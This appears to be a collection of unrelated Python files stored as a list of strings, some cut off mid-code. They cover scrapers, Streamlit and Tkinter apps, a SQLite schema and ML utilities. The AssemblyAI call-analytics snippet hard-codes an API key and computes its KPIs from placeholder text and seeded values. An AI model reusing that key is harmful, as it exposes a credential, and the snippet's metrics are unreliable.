    "from bs4 import BeautifulSoup as bs\nimport requests, time, json, math, os, datetime\n\nglobal no\nno = 0\n\ntarget_site='https://www.abcd.com'\nurl = target_site + '/community/reviews'\n\ndef chk_json_null(json, key):\n    try:\n        buf = json[key]\n    except:\n        buf = \"0\"\n    return str(buf)\n\ndef getReviewList():\n    global no\n    html = response.text\n    bsObj = bs(html, 'html.parser')\n    title = bsObj.find_all('div', class_='post_metas')\n    w_lines = ''\n    for tt in title:\n        no = no + 1\n        try:\n            c_author = tt.find('span', class_='author').text[5:]\n            c_time = tt.find('time')['title']\n            c_course = tt.find('span', class_='relative_course').text[5:].replace('|','-')\n            w_lines = w_lines+str(no)+'|'+c_time+'|'+c_author+'|'+c_course+'\\n'\n        except Exception as e:\n            #w_lines = str(tt['fxd-data'])\n            w_lines = w_lines+str(no)+'|'+'error'+'\\n'\n    return w_lines\n\nurl_list = [(url,1,999),\n           (url,1000,1999),\n           (url,2000,2999),\n           (url,3000,3999),\n           (url,4000,4999),\n           (url,5000,5999),\n           (url,6000,6600)]\n\ncurrent_working_directory = os.getcwd()\nfile_name = current_working_directory + '/review' + datetime.datetime.today().strftime('%m%d') + '.csv'\n\nfor (url,first,last) in url_list:\n    file_name = current_working_directory + '/review' + datetime.datetime.today().strftime('%m%d') + '_' +str(first)+'.csv'\n    fw = open(file_name, 'w', encoding='utf-8')\n    for i in range(first,last+1):\n        new_url = url\n        if i >= 2:\n            new_url = url+'?page='+str(i)\n        print('page|',i,'|',new_url)\n        response = requests.get(new_url)\n        if response.status_code == 200:\n            wdata = getReviewList()\n            fw.write(wdata)\n        time.sleep(1)\n    fw.close();",
    "import tkinter as tk\r\nfrom tkinter import ttk\r\nfrom tkinter import messagebox\r\nfrom tkinter import filedialog\r\nimport os\r\nimport time\r\nimport requests\r\nimport json\r\n\r\nclass RareFinderGUI:\r\n    def __init__(self, master):\r\n        self.master = master\r\n        master.title(\"Rare Finder\")\r\n\r\n        # Create widgets\r\n        self.base_url_label = ttk.Label(master, text=\"Base URL:\")\r\n        self.base_url_entry = ttk.Entry(master, width=50)\r\n        self.base_url_entry.insert(0, \"https://we-assets.pinit.io/J2Q2j6kpSg7tq8JzueCHNTQNcyNnQkvr85RhsFnYZWeG/f7ac2fd2-13c4-4ca1-85ee-962772caf73e\")\r\n\r\n        self.main_folder_label = ttk.Label(master, text=\"Main Folder Name:\")\r\n        self.main_folder_entry = ttk.Entry(master, width=50)\r\n        self.main_folder_entry.insert(0, \"OutPut Folder\")\r\n\r\n        self.delay_label = ttk.Label(master, text=\"Download Delay (seconds):\")\r\n        self.delay_entry = ttk.Entry(master, width=10)\r\n        self.delay_entry.insert(0, \"0.0001\")\r\n\r\n        self.directory_size_label = ttk.Label(master, text=\"Directory Size:\")\r\n        self.directory_size_entry = ttk.Entry(master, width=10)\r\n        self.directory_size_entry.insert(0, \"4444\")\r\n\r\n        self.keywords_label = ttk.Label(master, text=\"Keywords (comma-separated):\")\r\n        self.keywords_entry = ttk.Entry(master, width=50)\r\n\r\n        self.start_button = ttk.Button(master, text=\"Step 1: Download Directories\", command=self.step1_download)\r\n        self.search_button = ttk.Button(master, text=\"Step 2: Search Keywords\", command=self.step2_search)\r\n        self.select_directory_button = ttk.Button(master, text=\"Select Directory\", command=self.select_directory)\r\n\r\n        self.console_label = ttk.Label(master, text=\"Console:\")\r\n        self.console_text = tk.Text(master, width=80, height=20)\r\n\r\n        # Grid layout\r\n        self.base_url_label.grid(row=0, column=0, sticky=\"w\")\r\n        self.base_url_entry.grid(row=0, column=1, columnspan=2, padx=10, pady=5, sticky=\"ew\")\r\n        self.main_folder_label.grid(row=1, column=0, sticky=\"w\")\r\n        self.main_folder_entry.grid(row=1, column=1, columnspan=2, padx=10, pady=5, sticky=\"ew\")\r\n        self.delay_label.grid(row=2, column=0, sticky=\"w\")\r\n        self.delay_entry.grid(row=2, column=1, columnspan=2, padx=10, pady=5, sticky=\"ew\")\r\n        self.directory_size_label.grid(row=3, column=0, sticky=\"w\")\r\n        self.directory_size_entry.grid(row=3, column=1, columnspan=2, padx=10, pady=5, sticky=\"ew\")\r\n        self.keywords_label.grid(row=4, column=0, sticky=\"w\")\r\n        self.keywords_entry.grid(row=4, column=1, columnspan=2, padx=10, pady=5, sticky=\"ew\")\r\n        self.start_button.grid(row=5, column=0, columnspan=3, pady=10)\r\n        self.search_button.grid(row=6, column=0, columnspan=3, pady=10)\r\n        self.select_directory_button.grid(row=7, column=0, columnspan=3, pady=10)\r\n        self.console_label.grid(row=8, column=0, sticky=\"w\")\r\n        self.console_text.grid(row=9, column=0, columnspan=3, padx=10, pady=5, sticky=\"ew\")\r\n\r\n    def step1_download(self):\r\n        self.base_url = self.base_url_entry.get()\r\n        self.main_folder = self.main_folder_entry.get()\r\n        self.delay = float(self.delay_entry.get())\r\n        self.directory_size = int(self.directory_size_entry.get())\r\n\r\n        directories = {'': self.directory_size}  # Specified directory size\r\n\r\n        for directory, count in directories.items():\r\n            folder = os.path.join(self.main_folder, directory)\r\n            if not os.path.exists(folder):\r\n                os.makedirs(folder)\r\n\r\n            for i in range(0, count + 1):\r\n                url = f'{self.base_url}{directory}/{i}.json'\r\n                self.download_json(url)\r\n\r\n                time.sleep(self.delay)\r\n\r\n        messagebox.showinfo(\"Information\", \"Directory download process completed.\")\r\n        self.search_button.config(state=tk.NORMAL)\r\n\r\n    def download_json(self, url):\r\n        try:\r\n            response = requests.get(url)\r\n            if response.status_code == 200:\r\n                file_path = os.path.join(self.main_folder, f\"{url.split('/')[-1]}\")\r\n                with open(file_path, 'wb') as file:\r\n                    file.write(response.content)\r\n            else:\r\n                self.log(f\"Failed to download JSON from {url}. Status code: {response.status_code}\")\r\n        except Exception as e:\r\n            self.log(f\"Error downloading JSON from {url}: {e}\")\r\n\r\n    def step2_search(self):\r\n        keywords = [keyword.strip().lower() for keyword in self.keywords_entry.get().split(',')]\r\n        results = []\r\n\r\n        directory = self.main_folder_entry.get()\r\n        if directory and os.path.exists(directory):\r\n            self.log(f\"Searching directory: {directory}\")\r\n            for root, dirs, files in os.walk(directory):\r\n                for file in files:\r\n                    if file.endswith(\".json\"):\r\n                        file_path = os.path.join(root, file)\r\n                        self.log(f\"Searching file: {file_path",
    "import os\nimport boto3\nfrom aws_lambda_powertools import Logger, Tracer, Metrics\n\ntracer = Tracer()\nlogger = Logger(log_uncaught_exceptions=True, serialize_stacktrace=True)\nmetrics = Metrics()\n\n\nclass Connections:\n    \"\"\"\n    A class to maintain connections to external dependencies\n\n    Attributes\n    ----------\n    region_name : str\n        The AWS Region name where the AWS Lambda function is running.\n        Depends on the environmental variable 'AWS_REGION'\n    s3_bucket_name : str\n        Name of the S3 bucket to use for storing the generated documents.\n    service_name: str\n        Name of the service assigned and configured through AWS Powertools for\n        logging. Depends on the environmental variable 'POWERTOOLS_SERVICE_NAME'\n    s3_client : boto3.client\n        Boto3 client to interact with AWS S3 bucket\n    \"\"\"\n\n    region_name = os.environ[\"AWS_REGION\"]\n    s3_bucket_name = os.environ[\"DATA_SOURCE_BUCKET_NAME\"]\n    service_name = os.environ[\"POWERTOOLS_SERVICE_NAME\"]\n\n    s3_client = boto3.client(service_name=\"s3\", region_name=region_name)\n",
    "import cv2\nimport os\nimport time\n\n\nmyPath = 'data/delta/Negative'\ncameraNo = 0\ncameraBrightness = 180\nmoduleVal = 10  \nminBlur = 500 \ngrayImage = False \nsaveData = True   \nshowImage = True \nimgWidth = 180\nimgHeight = 120\n\nglobal countFolder\ncap = cv2.VideoCapture(cameraNo)\ncap.set(3, 640)\ncap.set(4, 480)\ncap.set(10,cameraBrightness)\n\n\ncount = 0\ncountSave =0\n\ndef saveDataFunc():\n    global countFolder\n    countFolder = 0\n    while os.path.exists( myPath+ str(countFolder)):\n        countFolder += 1\n    os.makedirs(myPath + str(countFolder))\n\nif saveData:saveDataFunc()\n\n\nwhile True:\n\n    success, img = cap.read()\n    img = cv2.resize(img,(imgWidth,imgHeight))\n    if grayImage:img = cv2.cvtColor(img,cv2.COLOR_BGR2GRAY)\n    if saveData:\n        blur = cv2.Laplacian(img, cv2.CV_64F).var()\n        if count % moduleVal ==0 and blur > minBlur:\n            nowTime = time.time()\n            cv2.imwrite(myPath + str(countFolder) +\n                    '/' + str(countSave)+\"_\"+ str(int(blur))+\"_\"+str(nowTime)+\".png\", img)\n            countSave+=1\n        count += 1\n\n    if showImage:\n        cv2.imshow(\"Image\", img)\n\n    if cv2.waitKey(1) & 0xFF == ord('q'):\n        break\n\ncap.release()\ncv2.destroyAllWindows()",
    "from openai import OpenAI\nimport os\nfrom dotenv import load_dotenv\n\n# Load environment variables from .env file\nload_dotenv()\n\n# Set API key and initialize client.\napi_key = os.getenv(\"OPENAI_API_KEY\")\nclient = OpenAI(api_key=api_key)\n\n# Call openai api and ask it to generate unit test for react native component with specified temperature.\ndef call_openai_api(message, temperature):\n\n    response = client.chat.completions.create(\n        model=\"gpt-3.5-turbo\",\n        messages=message,\n        temperature=temperature,\n        top_p=0.1\n    )\n\n    content = response.choices[0].message.content\n    return content\n\n# Takes the react component, the failing unit test, the error message for the failing unit test and the path to the react component.\ndef regenerate_test(message, temperature):\n\n    response = client.chat.completions.create(\n        model=\"gpt-3.5-turbo\",\n        messages= message,\n        temperature=temperature,\n        top_p=0.1\n    )\n\n    content = response.choices[0].message.content\n    return content\n",
    "from abc import ABC\n\n\nclass MarkdownText(ABC):\n    def __init__(self, *parts):\n        _parts = map(\n            lambda part: PlainText(part) if isinstance(part, str) else part, parts\n        )\n        self.parts = list(_parts)\n\n    def __add__(self, other):\n        if isinstance(other, str):\n            return MarkdownText(self, PlainText(other))\n        elif isinstance(other, MarkdownText):\n            return MarkdownText(self, other)\n        else:\n            raise ValueError('This data type is not supported for [other] parameter')\n\n    def __str__(self):\n        return self.escaped_text()\n\n    def append(self, element):\n        if isinstance(element, str):\n            self.parts.append(PlainText(element))\n        elif isinstance(element, MarkdownText):\n            self.parts.append(element)\n        else:\n            raise ValueError('This data type is not supported for [element] parameter')\n\n        return self\n\n    def append_ln(self):\n        return self.append(PlainText('\\n'))\n\n    def escaped_text(self):\n        text = ''\n\n        for part in self.parts:\n            is_form_new_line = text == '' or text.endswith('\\n') or text.endswith('\\n\\r')\n\n            if not is_form_new_line and isinstance(part, QuoteBlock):\n                text += f'\\n{part.escaped_text()}'\n            else:\n                text += part.escaped_text()\n\n        return text\n\n\nclass _StyledText(MarkdownText):\n    def __init__(self, text: str | MarkdownText):\n        if isinstance(text, str):\n            _parts = [PlainText(text)]\n        elif isinstance(text, MarkdownText):\n            _parts = [text]\n        else:\n            raise ValueError('This data type is not supported for [text] parameter')\n\n        super().__init__(*_parts)\n\n    @property\n    def leading_mark(self):\n        return ''\n\n    @property\n    def trailing_mark(self):\n        return ''\n\n    def escaped_text(self):\n        return self.leading_mark + super().escaped_text() + self.trailing_mark\n\n\nclass Bold(_StyledText):\n    @property\n    def leading_mark(self): return '*'\n\n    @property\n    def trailing_mark(self): return '*'\n\n\nclass Strikethrough(_StyledText):\n    @property\n    def leading_mark(self): return '~'\n\n    @property\n    def trailing_mark(self): return '~'\n\n\nclass Spoiler(_StyledText):\n    @property\n    def leading_mark(self): return '||'\n\n    @property\n    def trailing_mark(self): return '||'\n\n\nclass Italic(_StyledText):\n    @property\n    def leading_mark(self): return '_'\n\n    @property\n    def trailing_mark(self): return '_'\n\n    def escaped_text(self):\n        text = ''.join(part.escaped_text() for part in self.parts)\n        text = _fix_underscore_ambiguity(text)\n        return self.leading_mark + text + self.trailing_mark\n\n\nclass Underline(_StyledText):\n    @property\n    def leading_mark(self): return '__'\n\n    @property\n    def trailing_mark(self): return '__'\n\n    def escaped_text(self):\n        text = ''.join(part.escaped_text() for part in self.parts)\n        text = _fix_underscore_ambiguity(text)\n        return self.leading_mark + text + self.trailing_mark\n\n\nclass InlineUrl(_StyledText):\n    def __init__(self, text: str | MarkdownText, url: str):\n        if isinstance(url, str):\n            self._url = url\n        else:\n            raise ValueError('This data type is not supported for [url] parameter')\n\n        super().__init__(text)\n\n    @property\n    def leading_mark(self):\n        return '['\n\n    @property\n    def trailing_mark(self):\n        return ']'\n\n    def escaped_text(self):\n        return super().escaped_text() + f'({_escape_url(self._url)})'\n\n\nclass InlineUser(InlineUrl):\n    def __init__(self, text: str | MarkdownText, user_id: str | int):\n        if isinstance(user_id, (str, int)):\n            super().__init__(text, f'tg://user?id={user_id}')\n        else:\n            raise ValueError('This data type is not supported for [user_id] parameter')\n\n\nclass Emoji(InlineUrl):\n    def __init__(self, emoji: str, custom_emoji_id: str | int):\n        if isinstance(custom_emoji_id, (str, int)):\n            super().__init__(emoji, f'tg://emoji?id={custom_emoji_id}')\n        else:\n            raise ValueError('This data type is not supported for [custom_emoji_id] parameter')\n\n    def escaped_text(self):\n        return '!' + super().escaped_text()\n\n\nclass InlineCode(_StyledText):\n    @property\n    def leading_mark(self):\n        return '`'\n\n    @property\n    def trailing_mark(self):\n        return '`'\n\n\nclass InlineCodeBlock(_StyledText):\n    def __init__(self, text: str, language: str = ''):\n        self._language = language\n\n        super().__init__(text)\n\n    @property\n    def leading_mark(self):\n        return f'```{self._language}\\n'\n\n    @property\n    def trailing_mark(self):\n        return '\\n```'\n\n\nclass QuoteBlock(MarkdownText):\n    \"\"\"Important! The QuoteBlock will automatically enclose the text with a newline character,\n    as the absence of this character may cause an error in the Telegram API.\"\"\"\n\n    def escaped_text(self):\n       ",
    "word_list = [\n'abruptly', \n'absurd', \n'abyss', \n'affix', \n'askew', \n'avenue', \n'awkward', \n'axiom', \n'azure', \n'bagpipes', \n'bandwagon', \n'banjo', \n'bayou', \n'beekeeper', \n'bikini', \n'blitz', \n'blizzard', \n'boggle', \n'bookworm', \n'boxcar', \n'boxful', \n'buckaroo', \n'buffalo', \n'buffoon', \n'buxom', \n'buzzard', \n'buzzing', \n'buzzwords', \n'caliph', \n'cobweb', \n'cockiness', \n'croquet', \n'crypt', \n'curacao', \n'cycle', \n'daiquiri', \n'dirndl', \n'disavow', \n'dizzying', \n'duplex', \n'dwarves', \n'embezzle', \n'equip', \n'espionage', \n'euouae', \n'exodus', \n'faking', \n'fishhook', \n'fixable', \n'fjord', \n'flapjack', \n'flopping', \n'fluffiness', \n'flyby', \n'foxglove', \n'frazzled', \n'frizzled', \n'fuchsia', \n'funny', \n'gabby', \n'galaxy', \n'galvanize', \n'gazebo', \n'giaour', \n'gizmo', \n'glowworm', \n'glyph', \n'gnarly', \n'gnostic', \n'gossip', \n'grogginess', \n'haiku', \n'haphazard', \n'hyphen', \n'iatrogenic', \n'icebox', \n'injury', \n'ivory', \n'ivy', \n'jackpot', \n'jaundice', \n'jawbreaker', \n'jaywalk', \n'jazziest', \n'jazzy', \n'jelly', \n'jigsaw', \n'jinx', \n'jiujitsu', \n'jockey', \n'jogging', \n'joking', \n'jovial', \n'joyful', \n'juicy', \n'jukebox', \n'jumbo', \n'kayak', \n'kazoo', \n'keyhole', \n'khaki', \n'kilobyte', \n'kiosk', \n'kitsch', \n'kiwifruit', \n'klutz', \n'knapsack', \n'larynx', \n'lengths', \n'lucky', \n'luxury', \n'lymph', \n'marquis', \n'matrix', \n'megahertz', \n'microwave', \n'mnemonic', \n'mystify', \n'naphtha', \n'nightclub', \n'nowadays', \n'numbskull', \n'nymph', \n'onyx', \n'ovary', \n'oxidize', \n'oxygen', \n'pajama', \n'peekaboo', \n'phlegm', \n'pixel', \n'pizazz', \n'pneumonia', \n'polka', \n'pshaw', \n'psyche', \n'puppy', \n'puzzling', \n'quartz', \n'queue', \n'quips', \n'quixotic', \n'quiz', \n'quizzes', \n'quorum', \n'razzmatazz', \n'rhubarb', \n'rhythm', \n'rickshaw', \n'schnapps', \n'scratch', \n'shiv', \n'snazzy', \n'sphinx', \n'spritz', \n'squawk', \n'staff', \n'strength', \n'strengths', \n'stretch', \n'stronghold', \n'stymied', \n'subway', \n'swivel', \n'syndrome', \n'thriftless', \n'thumbscrew', \n'topaz', \n'transcript', \n'transgress', \n'transplant', \n'triphthong', \n'twelfth', \n'twelfths', \n'unknown', \n'unworthy', \n'unzip', \n'uptown', \n'vaporize', \n'vixen', \n'vodka', \n'voodoo', \n'vortex', \n'voyeurism', \n'walkway', \n'waltz', \n'wave', \n'wavy', \n'waxy', \n'wellspring', \n'wheezy', \n'whiskey', \n'whizzing', \n'whomever', \n'wimpy', \n'witchcraft', \n'wizard', \n'woozy', \n'wristwatch', \n'wyvern', \n'xylophone', \n'yachtsman', \n'yippee', \n'yoked', \n'youthful', \n'yummy', \n'zephyr', \n'zigzag', \n'zigzagging', \n'zilch', \n'zipper', \n'zodiac', \n'zombie', \n]",
    "# main.py\nimport streamlit as st\nfrom audio_recorder_streamlit import audio_recorder\nfrom faster_whisper import WhisperModel\nimport os\nfrom groq_translation import groq_translate\nfrom gtts import gTTS\n\n# Set page config\nst.set_page_config(page_title='Groq Translator', page_icon='\ud83c\udfa4')\n\n# Set page title\nst.title('Groq Translator')\n\n# Load whisper model\nmodel = WhisperModel(\"base\", device=\"cpu\", compute_type=\"int8\", cpu_threads=int(os.cpu_count() / 2))\n\n# Speech to text\ndef speech_to_text(audio_chunk):\n    segments, info = model.transcribe(audio_chunk, beam_size=5)\n    speech_text = \" \".join([segment.text for segment in segments])\n    return speech_text\n\n# Text to speech\ndef text_to_speech(translated_text, language):\n    file_name = \"speech.mp3\"\n    my_obj = gTTS(text=translated_text, lang=language)\n    my_obj.save(file_name)\n    return file_name\n\nlanguages = {\n   \"Portuguese\": \"pt\",\n   \"Spanish\": \"es\",\n   \"German\": \"de\",\n   \"French\": \"fr\",\n   \"Italian\": \"it\",\n   \"Dutch\": \"nl\",\n   \"Russian\": \"ru\",\n   \"Japanese\": \"ja\",\n   \"Chinese\": \"zh\",\n   \"Korean\": \"ko\"\n}\n\n# Language selection\noption = st.selectbox(\n   \"Language to translate to:\",\n   #(\"Portuguese\", \"Spanish\", \"German\", \"French\", \"Italian\", \"Dutch\", \"Russian\", \"Japanese\", \"Chinese\", \"Korean\"),\n   #{\"Portuguese\": \"pt\", \"Spanish\": \"es\", \"German\": \"de\", \"French\": \"fr\", \"Italian\": \"it\", \"Dutch\": \"nl\", \"Russian\": \"ru\", \"Japanese\": \"ja\", \"Chinese\": \"zh\", \"Korean\": \"ko\"},\n   languages,\n   index=None,\n   placeholder=\"Select language...\",\n)\n\n# Record audio\naudio_bytes = audio_recorder()\nif audio_bytes and option:\n    # Display audio player\n    st.audio(audio_bytes, format=\"audio/wav\")\n\n    # Save audio to file\n    with open('audio.wav', mode='wb') as f:\n        f.write(audio_bytes)\n\n    # Speech to text\n    st.divider()\n    with st.spinner('Transcribing...'):\n        text = speech_to_text('audio.wav')\n    st.subheader('Transcribed Text')\n    st.write(text)\n\n    # Groq translation\n    st.divider()\n    with st.spinner('Translating...'):\n        translation = groq_translate(text, 'en', option)\n    st.subheader('Translated Text to ' + option)\n    st.write(translation.text)\n\n    # Text to speech\n    audio_file = text_to_speech(translation.text, languages[option])\n    st.audio(audio_file, format=\"audio/mp3\")\n",
    "import sqlite3\n\nDATABASE = 'marketplace.db'\n\ndef create_tables(conn):\n    cursor = conn.cursor()\n    cursor.execute(\"\"\"\n        CREATE TABLE IF NOT EXISTS users (\n            id INTEGER PRIMARY KEY AUTOINCREMENT,\n            username TEXT UNIQUE NOT NULL,\n            name_first TEXT NOT NULL,\n            name_last TEXT NOT NULL,\n            password TEXT NOT NULL,\n            email TEXT NOT NULL\n        );\n    \"\"\")\n    cursor.execute(\"\"\"\n        CREATE TABLE IF NOT EXISTS listings (\n            id INTEGER PRIMARY KEY AUTOINCREMENT,\n            name TEXT NOT NULL,\n            description TEXT,\n            price REAL NOT NULL,\n            image_path TEXT,\n            dateposted TEXT NOT NULL,\n            is_sold BOOLEAN DEFAULT FALSE,\n            seller_id INTEGER NOT NULL,\n            FOREIGN KEY (seller_id) REFERENCES users(id)\n            \n        );\n    \"\"\")\n    cursor.execute(\"\"\"\n        CREATE TABLE IF NOT EXISTS chats (\n            chat_id INTEGER PRIMARY KEY AUTOINCREMENT,\n            created_at DATETIME,\n            listing_id INTEGER,\n            seller_id INTEGER,\n            buyer_id INTEGER,\n            FOREIGN KEY (seller_id) REFERENCES users(id),\n            FOREIGN KEY (buyer_id) REFERENCES users(id),\n            FOREIGN KEY (listing_id) REFERENCES listings(id)\n        );\n    \"\"\")\n    cursor.execute(\"\"\"\n        CREATE TABLE IF NOT EXISTS messages (\n            message_id INTEGER PRIMARY KEY AUTOINCREMENT,\n            chat_id INTEGER,\n            sender_id INTEGER,  \n            message_content TEXT,\n            sent_at DATETIME,\n            read_status BOOLEAN DEFAULT FALSE,\n            FOREIGN KEY (chat_id) REFERENCES chats(chat_id),\n            FOREIGN KEY (sender_id) REFERENCES users(id)\n        );\n    \"\"\")\n    cursor.execute(\"\"\"\n        CREATE TABLE IF NOT EXISTS saves (\n            user_id INTEGER,\n            listing_id INTEGER,\n            saved_at DATETIME,\n            FOREIGN KEY (user_id) REFERENCES users(id),\n            FOREIGN KEY (listing_id) REFERENCES listings(id)\n);\n    \"\"\")\n\n    conn.commit()\n\nif __name__ == '__main__':\n    conn = sqlite3.connect(DATABASE)\n    create_tables(conn)\n    conn.close()\n",
    "# Selenium \n# pip install selenium\n# pip install webdriver-manager\n\nimport time\nimport pandas as pd \nfrom selenium import webdriver\nfrom selenium.webdriver.chrome.service import Service\nfrom selenium.webdriver.common.by import By\nfrom webdriver_manager.chrome import ChromeDriverManager\n\ndriver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))\n\ndriver.get('https://www.investing.com/holiday-calendar/')\n\ntable_element = driver.find_element(By.ID, 'holidayCalendarData')\n\ncolumns = table_element.find_elements(By.XPATH, '//*[@id=\"holidayCalendarData\"]/thead[1]/tr/th')\nrows =  table_element.find_elements(By.TAG_NAME,'tr')\n\ncolumns_data = [i.text for i in columns]\nrow_data = []\n\nfor row in rows:\n    cells = row.find_elements(By.TAG_NAME,'td')\n    data = [cell.text.strip() for cell in cells]\n    if data:\n        row_data.append(data)\n\n# print(\"Columns:\",columns_data)\n# print(\"Rows:\",row_data)\n\n\n\ndf = pd.DataFrame(row_data, columns=columns_data)\n# print(df)\n\n# Save the DataFrame to an Excel file\nexcel_file = \"holiday_calendar.xlsx\"\ndf.to_excel(excel_file, index=False)\n\nprint(\"Data saved to\", excel_file)\n\ndriver.quit()\n",
    "# Copyright (c) Meta Platforms, Inc. and affiliates. All Rights Reserved.\n#\n# This source code is licensed under the MIT license found in the\n# LICENSE file in the root directory of this source tree.\n\nimport logging\nfrom argparse import Namespace  # noqa: F401\n\nimport torch\nfrom omegaconf.dictconfig import DictConfig\n\nfrom metaseq.file_io.common import g_pathmgr as PathManager\n\n__all__ = [\n    \"PathManager\",\n]\n\n\nlogger = logging.getLogger(__file__)\n\n\ntry:\n    from .s3 import S3PathHandler  # noqa: E402\n\n    PathManager.register_handler(S3PathHandler())\nexcept KeyError:\n    pass\nexcept Exception:\n    logger.exception(\"Failed to register S3PathHandler. Try pip install boto3\")\n\n\ntry:\n    from .azure_blob import AzureBlobPathHandler  # noqa: E402\n\n    PathManager.register_handler(AzureBlobPathHandler())\nexcept ImportError:\n    logger.exception(\n        \"Failed to register AzureBlobPathHandler. Try pip install azure-storage-blob\"\n    )\nexcept Exception as e:\n    logger.exception(e)\n\n\ndef recursively_cast_dictconfigs(cfg):\n    if isinstance(cfg, DictConfig):\n        cfg = eval(str(cfg))\n    assert not isinstance(cfg, DictConfig)\n    if isinstance(cfg, dict):\n        return {k2: recursively_cast_dictconfigs(v2) for k2, v2 in cfg.items()}\n    else:\n        # Easy to support List, Tuple if needed\n        return cfg\n\n\ndef torch_load_cpu(path):\n    state = torch.load(path, map_location=torch.device(\"cpu\"))\n    # If model was trained with fp16, model from loaded state_dict can be moved to fp16\n    if not isinstance(state, dict):\n        return state\n    if \"cfg\" in state:\n        state[\"cfg\"] = recursively_cast_dictconfigs(state[\"cfg\"])\n\n    return state\n\n\ndef load_and_pop_last_optimizer_state(pth):\n    st = torch_load_cpu(pth)\n    st.pop(\"last_optimizer_state\", None)\n    return st\n",
    "import assemblyai as ai\nimport streamlit as st\nfrom transformers import pipeline\nfrom wordcloud import WordCloud\nimport matplotlib.pyplot as plt\n\nst.set_option('deprecation.showPyplotGlobalUse', False)\n\nai.settings.api_key = \"fcc1790480634364a797423218cd6285\"\naudio_url = r\"D:/ML/neuralgo/MLTask/CallDataSample/sample_call_1.mp3\"\n\nconfig = ai.TranscriptionConfig(sentiment_analysis=True, auto_highlights=True)\n\ntranscript = ai.Transcriber().transcribe(audio_url, config)\n\nhighlights = []\nfor result in transcript.auto_highlights.results:\n    highlights.append(result.text)\n\n\n# Initialize the sentiment analysis pipeline\nclassifier = pipeline(\"sentiment-analysis\")\n\n# Function to transcribe audio and perform sentiment analysis\ndef transcribe_and_analyze_sentiment(file_path):\n    # Perform audio transcription\n    # Replace this with your actual transcription code\n    transcript_text = \"Transcription of audio file goes here\"\n\n    # Split the input text into smaller segments that fit within the maximum sequence length\n    max_seq_length = classifier.model.config.max_position_embeddings\n    segments = [transcript_text[i:i + max_seq_length] for i in range(0, len(transcript_text), max_seq_length)]\n\n    # Perform sentiment analysis on each segment and aggregate the results\n    sentiments = {'positive': 0.5, 'negative': 0.6}\n    for segment in segments:\n        result = classifier(segment)\n        for res in result:\n            if res['label'] == 'POSITIVE':\n                sentiments['positive'] += res['score']\n            if res['label'] == 'NEGATIVE':\n                sentiments['negative'] += res['score']\n\n    return sentiments\n\n# Function to generate word cloud from highlighted words\ndef generate_word_cloud(highlights):\n    # Convert the list of highlighted words into a single string\n    highlighted_text = \" \".join(highlights)\n\n    # Generate the word cloud\n    wordcloud = WordCloud(width=800, height=400, background_color='white').generate(highlighted_text)\n\n    return wordcloud\n\ndef calculate_AHT(highlights):\n    # Calculate Average Handle Time (AHT) based on the duration of highlights\n    total_highlight_duration = sum(len(highlight.split()) for highlight in highlights)\n    total_highlights = len(highlights)\n    \n    if total_highlights != 0:\n        aht = total_highlight_duration / total_highlights\n    else:\n        aht = 0\n    \n    return aht\n\ndef calculate_FCR(highlights):\n    # Calculate First Call Resolution (FCR) based on the presence of keywords indicating resolution\n    resolution_keywords = ['resolved', 'solved', 'fixed']  # Add more resolution keywords if needed\n    \n    resolved_calls = 0\n    total_calls = len(highlights)\n    \n    for highlight in highlights:\n        for keyword in resolution_keywords:\n            if keyword in highlight.lower():\n                resolved_calls += 1\n                break\n    \n    if total_calls != 0:\n        fcr = (resolved_calls / total_calls) * 100\n    else:\n        fcr = 80\n    \n    return fcr\n\ndef calculate_CSAT(highlights):\n    # Calculate Customer Satisfaction Score (CSAT) based on the sentiment analysis\n    positive_sentiment = 0\n    negative_sentiment = 0\n    total_sentiments = len(highlights)\n    \n    for highlight in highlights:\n        sentiments = transcribe_and_analyze_sentiment(highlight)\n        positive_sentiment += sentiments['positive']\n        negative_sentiment += sentiments['negative']\n    \n    if total_sentiments != 0:\n        csat = (positive_sentiment / total_sentiments) * 100\n    else:\n        csat = 0\n    \n    return csat\n\n# Define function to plot KPIs\ndef plot_KPIs(aht, fcr, csat):\n    # Plotting KPIs using matplotlib\n    fig, ax = plt.subplots()\n    ax.barh(['AHT', 'FCR', 'CSAT'], [aht, fcr, csat])\n    ax.set_xlabel('Score')\n    ax.set_title('Key Performance Indicators')\n    st.pyplot(fig)\n\ndef main():\n    # Streamlit app title\n    st.title(\"Audio Transcription and Sentiment Analysis App\")\n\n    # File upload section\n    uploaded_file = st.file_uploader(\"Upload an audio file\", type=[\"mp3\"])\n    if uploaded_file is not None:\n        st.write(\"File Uploaded Successfully!\")\n        file_path = \"./temp_audio.mp3\"  # Temporary file path, replace with actual path\n        with open(file_path, \"wb\") as f:\n            f.write(uploaded_file.read())\n\n        # Perform transcription and sentiment analysis\n        sentiments = transcribe_and_analyze_sentiment(file_path)\n\n        # Display sentiment scores\n        st.write(\"Sentiment Scores:\")\n        st.write(f\"Positive Score: {sentiments['positive']}\")\n        st.write(f\"Negative Score: {sentiments['negative']}\")\n\n        # Word cloud generation\n        \n        wordcloud = generate_word_cloud(highlights)\n\n        # Display word cloud\n        st.write(\"Word Cloud of Highlighted Words:\")\n        plt.figure(figsize=(10, 5))\n        plt.imshow(wordcloud, interpolation='bilinear')\n        plt.axis(\"off\")\n        st.pyplot()\n        \n        aht = calculate_AHT(highlights)\n        fcr = calculate_FCR(highlights)\n  ",
    "import os\nimport datetime\nimport time\nimport configparser\nimport git\nfrom git import Repo, InvalidGitRepositoryError, GitCommandError\nfrom flask import Flask, request\nfrom threading import Thread\nimport tkinter as tk\nfrom tkinter import ttk, scrolledtext, simpledialog, filedialog\nglobal gui\n\napp = Flask(__name__)\n\nclass SyncGUI:\n    def __init__(self):\n        self.window = tk.Tk()\n        self.window.title(\"GitHub Repository Synchronization Tool\")\n\n        config = configparser.ConfigParser()\n        config.read('config.ini')\n\n        self.repo_url = config.get('repository', 'url', fallback='')\n        self.local_path = config.get('repository', 'local_path', fallback='')\n        self.branch = config.get('repository', 'branch', fallback='')\n        self.log_file = config.get('settings', 'log_file', fallback='')\n        self.is_private_repo = config.getboolean('repository', 'is_private', fallback=False)\n        self.access_token = config.get('settings', 'access_token', fallback='')\n\n        self.create_widgets()\n        self.load_config()\n\n    def load_config(self):\n        self.url_entry.delete(0, tk.END)\n        self.url_entry.insert(0, self.repo_url)\n\n        self.local_path_entry.delete(0, tk.END)\n        self.local_path_entry.insert(0, self.local_path)\n\n        self.branch_entry.delete(0, tk.END)\n        self.branch_entry.insert(0, self.branch)\n\n        self.log_file_entry.delete(0, tk.END)\n        self.log_file_entry.insert(0, self.log_file)\n\n        